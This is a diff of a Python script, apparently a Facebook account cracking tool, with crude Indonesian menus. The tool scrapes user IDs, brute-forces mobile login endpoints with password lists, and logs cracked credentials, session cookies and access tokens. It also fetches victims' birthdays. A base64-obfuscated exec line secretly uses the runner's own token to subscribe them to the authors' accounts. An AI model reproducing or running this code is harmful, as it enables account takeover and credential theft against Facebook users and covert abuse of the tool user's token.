@@ -53,23 +53,22 @@ def folder():
 	try:os.mkdir('data')
 	except:pass
 	try:
-		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+		ua_ = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
 		open("data/ua.txt","w").write(ua_)
 	except:
 		pass
 # LOGO (LO GOBLOK)
 IP = requests.get("https://api.ipify.org/").text
 def banner():
-	print("""\x1b[0;92m   __________ ____   _________________
-\x1b[0;92m    __  __  /  __ \_/  /     )   ____/\x1b[0;97m|| \x1b[0;93mPantek
-\x1b[0;92m     / ____/    /     /  ——  /  /__   \x1b[0;97m|| \x1b[0;93mMulti
-\x1b[0;92m    / /  ___   / /\/  / __ <   ___/   \x1b[0;97m|| \x1b[0;93mBrute
-\x1b[0;92m   /_/  /__/  /_/  /_/_____/__/       \x1b[0;97m|| \x1b[0;93mForce
-\x1b[0;97m═════════════════════════════════════════════════
-\x1b[0;92m[•] \x1b[0;97mCode by  : \x1b[0;93mAang Ardiansyah-XD \x1b[0;97m& \x1b[0;93mRomi Afrizal
-\x1b[0;92m[•] \x1b[0;97mGithub   : \x1b[0;97mHttps://github.com/AngCyber
-\x1b[0;92m[•] \x1b[0;97mFacebook : \x1b[0;97mSaya Aang & Why Aang Ardiansyah 
-\x1b[0;97m═════════════════════════════════════════════════""")
+	print("""\x1b[0;93m  _________ _____  ___ ______ __________
+\x1b[0;93m  __   _  / __   \/  /__  _  ) __  ____/
+\x1b[0;93m   / ____/   / /\_/ /  / _  <   /  __/
+\x1b[0;93m  /_/       /_/  /_/  /_____/  /__/
+\x1b[0;97m#--------------------------------------#
+\x1b[0;93m• \x1b[0;97mCreate By : \x1b[0;93mAang Ardiansyah-XD
+\x1b[0;93m• \x1b[0;97mFacebook  : \x1b[0;93mFacebook.com/MyAangXd
+\x1b[0;93m• \x1b[0;97mGithub    : \x1b[0;93mGithub.com/AngCyber
+\x1b[0;97m#--------------------------------------#""")
 # MASUK TOKEN (TOKEN LISTRIK)
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 def masuk():
@@ -114,7 +113,7 @@ def masuk():
     else:
     	print("%s[•] Isi yang benar kentod "%(M));exit()
 exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))
-# DUMP PUBLIK
+# DUMP PUBLIK HEHE
 def publik(romz,headers=header):
     try:
         os.mkdir('dump')
@@ -167,7 +166,7 @@ def followers(romz,headers=header):
         menu()
     except Exception as e:
         exit('\n%s[•] Ketik Ulang Perintahnya'%(P))
-# DUMP POSTINGAN 
+# DUMP POSTINGAN HEHE
 def postingan(romz,headers=header):
     try:
         os.mkdir('dump')
@@ -193,7 +192,7 @@ def postingan(romz,headers=header):
         menu()
     except Exception as e:
         exit('\n%s[•] Ketik Ulang Perintahnya'%(P))
-# START CRACK
+# START CRACK (MULAI NGECROT AWOKAWOK)
 class ngentod:
 
     def __init__(self):
@@ -202,11 +201,11 @@ class ngentod:
         try:
             self.apk = raw_input('\n%s[?] File dump :%s '%(P,K))
             self.id = open(self.apk).read().splitlines()
-            print '%s[%s•%s] Total id : %s%s' %(P,K,P,H,len(self.id))
+            print '%s[%s•%s] Total id  : %s%s' %(P,K,P,H,len(self.id))
         except:
             print '\n%s[!] File dump tidak ada, dump id dulu lah kentod'%(M)
             raw_input('\n%s[•] %sEnter %s '%(P,K,P));menu()
-        unikers = raw_input('%s[?] ingin menggunakan password manual? [y/t] :%s '%(P,K))
+        unikers = raw_input('%s[?] Ingin menggunakan password manual? [y/t] :%s '%(P,K))
         if unikers in ('Y', 'y'):
             print '\n%s[%s!%s] Gunakan (koma) untuk tanda pemisah sandi '%(P,M,P,H,P)
             while True:
@@ -217,7 +216,7 @@ class ngentod:
                     print '\n%s[!] password minimal 6 karakter'%(M)
                 else:
                     def zona(zafi_=None): 
-                        ind = raw_input('\n%s[?] metode : %s'%(P,K))
+                        ind = raw_input('\n%s[?] Metode : %s'%(P,K))
                         if ind == '':
                             print("%s[•] Isi yang benar kentod "%(M));self.zona()
                         elif ind in ('1', '01'):
@@ -348,9 +347,9 @@ class ngentod:
                 sys.stdout.flush()
                 b_api(self, user, zona)
             if 'session_key' in response.text and 'EAAA' in response.text:
-                print '\r%s[•]Okehh}> %s|%s|%s ' % (H,user,pw,response.json()['access_token'])
+                print '\r%sOK %s|%s|%s ' % (H,user,pw,response.json()['access_token'])
                 ok.append('%s • %s • %s' % (user,pw,response.json()['access_token']))
-                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('╠[OK] %s • %s • %s\n'%(user,pw,response.json()['access_token']))
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('[OK] %s • %s • %s\n'%(user,pw,response.json()['access_token']))
                 break
                 continue
             elif 'www.facebook.com' in response.json()['error_msg']:
@@ -359,29 +358,29 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%s[•]Cepeh}> %s|%s|%s %s %s  ' % (K,user,pw,day,month,year)
+                    print '\r%sCP %s|%s|%s %s %s  ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
-                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
+                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
                 except KeyError:
                     day = ''
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%s[•]Cepeh}> %s|%s           ' % (K,user,pw)
+                print '\r%sCP %s|%s           ' % (K,user,pw)
                 cp.append('%s • %s' % (user,pw))
-                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s\n"%(user,pw))
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s\n"%(user,pw))
                 break
                 continue
         loop += 1
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
-        print('\r%s[•] Crack %s/%s OK:%s - CP:%s'%(rm,loop,len(self.id),len(ok),len(cp))),
+        print('\r%s[Crack][%s/%s][OK/%s][CP/%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
     def basic(self, user, zona):
         try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
-        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+        	ua = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
         global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
@@ -407,9 +406,9 @@ class ngentod:
             po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r%s[•]Okehh}> %s|%s|%s  ' % (H,user,pw,kuki)
+                print '\r%sOK %s|%s|%s  ' % (H,user,pw,kuki)
                 ok.append("%s • %s • %s"% (user,pw,kuki))
-                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[OK] %s • %s • %s\n"%(user,pw,kuki))
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[OK] %s • %s • %s\n"%(user,pw,kuki))
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
@@ -418,29 +417,29 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%s[•]Cepeh}> %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r%sCP %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
-                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
+                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
                 except KeyError:
                     day = ''
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%s[•]Cepeh}> %s|%s            ' % (K,user,pw)
+                print '\r%sCP %s|%s            ' % (K,user,pw)
                 cp.append("%s • %s"% (user,pw))
-                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s\n"%(user,pw))
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s\n"%(user,pw))
                 break
                 continue
         loop += 1
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
-        print('\r%s[•] Crack %s/%s OK:%s - CP:%s'%(rm,loop,len(self.id),len(ok),len(cp))),
+        print('\r%s[Crack][%s/%s][OK/%s][CP/%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
     def mobil(self, user, zona):
         try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
-        	ua = 'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.8.2.1;]'
+        	ua = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
         global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
@@ -466,9 +465,9 @@ class ngentod:
             po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r%s[•]Okehh}> %s|%s|%s ' % (H,user,pw,kuki)
+                print '\r%sOK %s|%s|%s ' % (H,user,pw,kuki)
                 ok.append("%s • %s • %s"% (user,pw,kuki))
-                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[Ok] %s • %s • %s\n"%(user,pw,kuki))
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Ok] %s • %s • %s\n"%(user,pw,kuki))
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
@@ -477,23 +476,23 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%s[•]Cepeh}> %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r%sCP %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
-                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
+                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
                 except KeyError:
                     day = ''
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%s[•]Cepeh}> %s|%s              ' % (K,user,pw)
+                print '\r%sCP %s|%s              ' % (K,user,pw)
                 cp.append("%s • %s"% (user,pw))
-                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s\n"%(user,pw))
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s\n"%(user,pw))
                 break
                 continue
         loop += 1
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
-        print('\r%s[•] Crack %s/%s OK:%s - CP:%s'%(rm,loop,len(self.id),len(ok),len(cp))),
+        print('\r%s[Crack][%s/%s][OK/%s][CP/%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
 def crack2(user, pwx):
 	global looping, loping
@@ -504,7 +503,7 @@ def crack2(user, pwx):
 		else:
 			if len(status_foll) != 1:
 				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
-				print('\r%s[•] Crack %s/%s OK:%s - CP:%s'%(rm,loop,len(self.id),len(ok),len(cp))),
+				print('\r%s[Crack][%s/%s][OK/%s][CP/%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
 				sys.stdout.flush()
 				c_bff_ -= 1
 			else:
@@ -592,7 +591,7 @@ def uas():
             	jalan("%s[•] Anda akan di arahkan ke browser ] "%(H));jeda(2)
             	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
             elif ua in("default","Default","DEFAULT"):
-                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+                ua = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
                 open("data/ua.txt","w").write(ua_)
                 print ("\n%s[✓] Menggunakan user agent bawaan"%(H));jeda(2);menu()
             open("data/ua.txt","w").write(ua);jeda(2)
@@ -624,17 +623,17 @@ def menu():
     except requests.exceptions.ConnectionError:
         exit("%s[!] Kesalahan koneksi "%(M))
     banner()
-    print ('%s\n[ Selamat Datang %s%s%s Ngentod ]\n'%(P,K,nama,P));time.sleep(0.05)
-    print ('[%s1%s] Dump ID From Publik'%(K,P)) ;time.sleep(0.05)
-    print ('[%s2%s] Dump ID From Followers'%(K,P));time.sleep(0.05)
-    print ('[%s3%s] Dump ID From Reaction Post'%(K,P));time.sleep(0.05)
-    print ('[%s4%s] Crack Akun Instagram '%(K,P));time.sleep(0.05)
-    print ('[%s5%s] %sMulai Crack %s'%(K,P,H,P));time.sleep(0.05)
-    print ('[%s6%s] Setting User Agent'%(K,P));time.sleep(0.05)
-    print ('[%s7%s] Cek Hasil Crack'%(K,P));time.sleep(0.05)
+    print ('%s\n[ Selamat Datang %s%s%s Ngentod ]\n'%(P,K,nama,P));time.sleep(0.04)
+    print ('[%s1%s] Dump ID From Publik'%(K,P)) ;time.sleep(0.04)
+    print ('[%s2%s] Dump ID From Followers'%(K,P));time.sleep(0.04)
+    print ('[%s3%s] Dump ID From React Postingan'%(K,P));time.sleep(0.04)
+    print ('[%s4%s] Crack Akun Instagram [Pake Nama] '%(K,P));time.sleep(0.04)
+    print ('[%s5%s] %sMulai Crack %s'%(K,P,H,P));time.sleep(0.04)
+    print ('[%s6%s] Setting User Agent'%(K,P));time.sleep(0.04)
+    print ('[%s7%s] Cek Hasil Crack'%(K,P));time.sleep(0.04)
     #print ('[%s8%s] Gabung group'%(K,P));time.sleep(0.04)
     #print ('[%s9%s] Info script'%(K,P));time.sleep(0.04)
-    print ('[%s0%s] Keluar [\x1b[0;91mAhh Ngecrot\x1b[0;97m] '%(M,P));time.sleep(0.05)
+    print ('[%s0%s] Keluar [\x1b[0;91mAhh Ngecrot\x1b[0;97m] '%(M,P));time.sleep(0.04)
     unik = raw_input('\n%s[•] Menu : %s'%(P,K));time.sleep(0.05)
     if unik == '':
         print("%s[•] Isi yang benar kentod"%(M));jeda(2);menu()
@@ -673,7 +672,7 @@ def hasill(c):
 			dirs = os.listdir("hasil")
 			print ("")
 			for file in dirs:
-				print("%s[•]%s%s"%(K,P,file));jeda(0.2)
+				print("%sFile : %s%s"%(K,P,file));jeda(0.2)
 			print("\n%s[%s•%s] Contoh : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
 			file = raw_input("%s[?] Masukan nama file : "%(P));jeda(2)
 			if file == "":
@@ -682,12 +681,12 @@ def hasill(c):
 			print("%s[%s•%s] Hasil Crack Akun Fb"%(P,K,P));jeda(2)
 			nm_file = ("%s"%(file)).replace("-", " ")
 			jalan("[%s•%s] Total Akun : %s"%(K,P,len(total)))
-			print("%s[%s•%s]══════════════════════════════════════════════════════%s"%(P,K,P,H));jeda(2)
+			print("%s[%s#%s]------------------------------------------%s"%(P,K,P,H));jeda(1)
 			for akun in total:
 				fb = akun.replace("\n","")
 				tling  = fb.replace("-> ", "->").replace("->", "-> ")
 				print(tling);jeda(0.03)
-			print("%s[%s•%s]══════════════════════════════════════════════════════%s"%(P,K,P,H));jeda(2)
+			print("%s[%s#%s]------------------------------------------%s"%(P,K,P,H));jeda(1)
 			raw_input('\n%s[•] %sEnter %s'%(P,K,P));menu()
 		except (IOError):
 			print("\n%s [!] tidak ada hasil "%(M))
@@ -702,10 +701,10 @@ def hasill(c):
 				oke = open("okeh.txt", "r").readlines()
 				print("%s[%s•%s] Hasil Crack Akun OK"%(P,K,P));jeda(2)
 				jalan("[%s•%s] Total Akun : %s%s"%(K,P,H,str(len(oke))))
-				print("%s[%s•%s]══════════════════════════════════════════════════════%s"%(P,K,P,H));jeda(2)
+				print("%s[%s#%s]------------------------------------------%s"%(P,K,P,H));jeda(1)
 				okek = open("okeh.txt", "r").read()
 				print (okek)
-				exit("%s[%s•%s]══════════════════════════════════════════════════════"%(P,K,P));jeda(2)
+				exit("%s[%s#%s]------------------------------------------"%(P,K,P));jeda(1)
 			except IOError,KeyError:
 				exit (M+"\n[•] Tidak ada hasil awokawok")
 		elif rom in['2','02']:
@@ -713,10 +712,10 @@ def hasill(c):
 				cepe = open("cepeh.txt", "r").readlines()
 				print("%s[%s•%s] Hasil Crack Akun CP"%(P,K,P));jeda(2)
 				jalan("[%s•%s] Total Akun : %s%s"%(K,P,K,str(len(cepe))))
-				print("%s[%s•%s]══════════════════════════════════════════════════════%s"%(P,K,P,H));jeda(2)
+				print("%s[%s#%s]------------------------------------------%s"%(P,K,P,H));jeda(1)
 				cepek = open("cepeh.txt", "r").read()
 				print (cepek)
-				exit("%s═══════════════════════════════════════════════════════"%(P,K,P));jeda(2)
+				exit("%s[#]------------------------------------------"%(P,K,P));jeda(1)
 			except IOError,KeyError:
 				exit (M+"\n[•] Tidak ada hasil awokawokawok")
 		else:
